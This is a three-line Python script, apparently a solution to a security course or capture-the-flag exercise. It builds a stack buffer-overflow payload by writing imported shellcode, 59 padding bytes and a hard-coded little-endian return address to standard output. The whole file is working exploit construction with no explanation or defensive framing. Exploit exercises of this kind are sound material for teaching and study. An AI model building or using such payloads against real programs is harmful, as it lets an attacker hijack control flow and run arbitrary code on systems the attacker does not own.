from shellcode import shellcode
import sys
sys.stdout.buffer.write(shellcode+59*b'\xBB'+ 0xfff6ce7c.to_bytes(4, "little"))
